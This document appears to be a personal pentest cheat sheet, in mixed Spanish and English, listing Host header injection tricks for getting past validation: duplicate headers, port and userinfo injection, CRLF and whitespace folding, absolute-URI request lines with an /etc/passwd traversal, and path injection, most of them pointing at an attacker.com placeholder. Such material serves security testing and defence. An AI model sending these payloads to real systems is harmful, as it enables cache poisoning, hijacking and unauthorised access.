---
aliases:
  - HHI Bypass
  - Host Header Validation Bypass
  - Multiple Host Headers
tags:
  - type/cheatsheet
  - vuln/host-header-injection
  - technique/defense-evasion
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - '[[Host Header Injection]]'
---
# Host Header Injection - Bypass de Validación

***

## Multiple Host Headers

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Doble Host | `Host: target.com\r\nHost: attacker.com` | RFC dice rejectar — algunos parsers laxos. |
| Different parsers diff | Frontend toma 1ro, backend 2do (o viceversa) | Standard differential. |
| First wins | Some servers procesan only first | Probe behavior. |
| Last wins | Others procesan last | Differential. |
| Concatenated | Backend concatenates con coma | Edge. |
| Different case | `Host: target.com\r\nhost: attacker.com` | Case-insensitive but separate keys? |
| Doble después de body | Headers después de empty line ignored | Edge. |
| HRS combo | Smuggle one Host header en second request | Multi-vector. |
| HTTP/2 :authority | `:authority: target.com` + `Host: attacker.com` | H2-specific differential. |
| nginx 400 vs Apache | nginx reject duplicates, Apache laxer | Per-server. |
| Spring tolerant | Spring frameworks tolerantes | Per-stack. |
| Tomcat behavior | Tomcat parses both, uses last | Java specific. |
^hhi-bypass-multiple

___

## Port Injection

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Port injection en Host | `Host: target.com:1337` | Bypass simple Host validation. |
| Port en URL | App generates `https://target.com:1337/path` | Reflected con weird port. |
| Port 0 | `Host: target.com:0` | Some parsers interpret distinct. |
| Negative port | `Host: target.com:-1` | Edge. |
| Doble port | `Host: target.com:80:80` | Some apps reject, others accept. |
| Trailing slash port | `Host: target.com:80/` | Path injection. |
| Port-only | `Host: :1337` | Empty hostname. |
| Combine con scheme | `Host: https://target.com:1337` | Absolute URL trick. |
| Port que apunte a atacante | `Host: target.com:8080@attacker.com` | Userinfo trick. |
| Tunnel port | If app forwards based on port | Edge routing. |
^hhi-bypass-port

___

## Indentation / Whitespace

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Indented continuation (RFC obsolete) | `Host: target.com\r\n attacker.com` | Folded headers — obsolete pero algunos parsers aceptan. |
| Tab indentation | `Host:\ttarget.com` | Tab char. |
| Leading whitespace | `Host:  target.com` (multi-space) | Standard tolerated. |
| Trailing whitespace | `Host: target.com  ` | Trailing strip varies. |
| CR within Host | `Host: target.com\r attacker.com` | CRLF injection. |
| LF within Host | `Host: target.com\nattacker.com` | Same. |
| NUL byte | `Host: target.com\x00.attacker.com` | Truncation. |
| Vertical tab | `Host: target.com\x0battacker.com` | Edge. |
| Form feed | `Host: target.com\x0cattacker.com` | Edge. |
| Spaces in hostname | `Host: target .com` | Some parsers strip. |
| Mixed whitespace | `Host:\t target.com\t ` | Combined. |
| `\r\n\r\n` truncate | `Host: target.com\r\n\r\nGET /admin` | HRS adjacent. |
^hhi-bypass-whitespace

___

## Absolute URL en Request Line

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Absolute URL form | `GET https://attacker.com/path HTTP/1.1` (absoluteURI) | Some servers prefer URL host over Host header. |
| With Host header | `GET https://attacker.com/path HTTP/1.1\r\nHost: target.com` | Differential. |
| Proxy-style request | RFC 7230 — proxies recibir absoluteURI | Backend behavior. |
| HTTP/2 :path absolute | `:path: https://attacker.com/path` | H2 variant. |
| Origin-form vs absolute | Most apps expect origin-form `/path` | Test absolute. |
| URL with userinfo | `GET https://user:pass@attacker.com/ HTTP/1.1` | Userinfo. |
| Encoded chars en URL | `GET https://attacker%2Ecom/ HTTP/1.1` | Encoded. |
| Path traversal en URL | `GET https://target.com/../etc/passwd HTTP/1.1` | Combo. |
| Multiple slashes | `GET https://target.com//admin HTTP/1.1` | Path normalization. |
| Combine con Host | Different host en URL vs header | Differential. |
^hhi-bypass-absolute

___

## Path Injection en Host

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Path en Host | `Host: target.com/admin` | Some parsers split, others use full string. |
| Slash en Host | `Host: target.com/path?injected=1` | Query injection. |
| Fragment | `Host: target.com#evil` | Fragment in Host. |
| Userinfo | `Host: user@target.com` | RFC technically allows. |
| `@` separator abuse | `Host: target.com@attacker.com` | Userinfo confusion. |
| Mixed encoding | `Host: target%2Ecom` | URL-encoded chars. |
| `\` backslash | `Host: target.com\path` | Backslash en Host. |
| Combine con base href | If reflected en `<base href="https://${HOST}">`, path included | XSS combo. |
| Combine con Open Redirect | Path en Host → atacante's URL en redirect | Open Redirect chain. |
| Cookie domain abuse | If cookie domain set from Host with path | Edge. |
^hhi-bypass-path

***
